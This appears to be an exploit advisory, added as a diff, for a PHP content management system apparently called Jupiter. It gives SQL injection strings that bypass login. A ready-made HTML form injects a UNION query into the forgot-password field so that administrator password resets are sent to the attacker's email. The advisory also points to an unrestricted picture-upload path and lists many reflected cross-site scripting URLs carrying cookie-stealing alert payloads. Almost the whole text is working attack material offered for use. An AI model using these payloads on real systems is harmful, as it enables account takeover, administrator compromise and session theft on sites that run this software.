@@ -1,0 +1,60 @@
+if magic_quotes_gpc = off
+login with
+user name :
+&#039; or id=1/*
+or
+&#039; or authorization = 4/*
+
+index.php?n=http://www.example.com/modules/register&amp;a=3&amp;d=3&amp;key=&#039;%20or%20id=1/*
+You will be able to change the password for any user .. know his id and put it in the url.
+
+--
+or you can use this form by changing http://localhost/jupiter/  to the website dir to recive reset password email to all the administrators
+
+&lt;form method=&quot;post&quot; action=&quot;http://localhost/jupiter/index.php?n=http://www.example.com/modules/register&quot;&gt;
+&lt;table class=&quot;main&quot; cellspacing=&quot;1&quot; cellpadding=&quot;4&quot; width=&quot;100%&quot;&gt;
+&lt;tr class=&quot;head&quot;&gt;
+&lt;td colspan=&quot;2&quot; class=&quot;head&quot;&gt;Forgot your password?&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td class=&quot;con1&quot; width=&quot;42%&quot; valign=&quot;middle&quot;&gt;&lt;span class=&quot;hilight&quot;&gt;Username:&lt;/span&gt;&lt;/td&gt;
+&lt;td class=&quot;con1&quot; width=&quot;58%&quot; valign=&quot;bottom&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;fpwusername&quot; style=&quot;width:100%&quot; class=&quot;box&quot; tabindex=&quot;5&quot; value=&quot;&#039; union select id,authorization
+,username ,password
+,&#039;security@soqor.net&#039;,url,age,flag,location,registered,lastvisit,forum_lastvisit,ip,forumposts,signature,aboutme,msn,yahoo,icq,aim,skype,avatar,hideemail,templates,ca
+lendarbday,status,multikey,actime from users where id=1or authorization=4/*&quot;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td class=&quot;con1&quot;&gt;&lt;input type=&quot;button&quot; style=&quot;width:100&quot; class=&quot;box&quot; value=&quot;Back&quot; onClick=&quot;window.history.go(-1);&quot; tabindex=&quot;8&quot;&gt;&lt;/td&gt;
+&lt;td class=&quot;con1&quot; align=&quot;right&quot;&gt;&lt;input type=&quot;submit&quot; style=&quot;width:100&quot; class=&quot;box&quot; value=&quot;Submit&quot; tabindex=&quot;7&quot;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;a&quot; value=&quot;3&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;1&quot;&gt;
+&lt;/table&gt;
+&lt;/form&gt;
+
+put the user name value
+Change security@soqor.net to your email
+&#039; union select id,authorization ,username ,password
+,&#039;security@soqor.net&#039;,url,age,flag,location,registered,lastvisit,forum_lastvisit,ip,forumposts,signature,aboutme,msn,yahoo,icq,aim,skype,avatar,hideemail,templates,ca
+lendarbday,status,multikey,actime from users where id=1or authorization=4/*
+
+Upload any picture to their gallery
+
+http://www.example.com/modules/galleryuploadfunction.php
+
+picture path will be
+gallery/albums/public/name.ext
+
+http://www.example.com/modules/blocks.php?is_webmaster=2&amp;language[Admin%20name]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/blocks.php?is_webmaster=2&amp;language[Admin%20back]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/register.php?is_guest=1&amp;language[Register%20title]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/register.php?is_guest=1&amp;language[Register%20title2]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/mass-email.php?language[Mass-Email%20form%20title]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/mass-email.php?language[Mass-Email%20form%20desc]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/mass-email.php?language[Mass-Email%20form%20desc2]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/register.php?is_guest=1&amp;a=3&amp;language[Forgotten%20title]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/register.php?is_guest=1&amp;a=3&amp;language[Forgotten%20desc]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/register.php?is_guest=1&amp;a=3&amp;language[Forgotten%20desc2]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/search.php?language[Search%20view%20desc]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/search.php?language[Search%20view%20desc2]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+
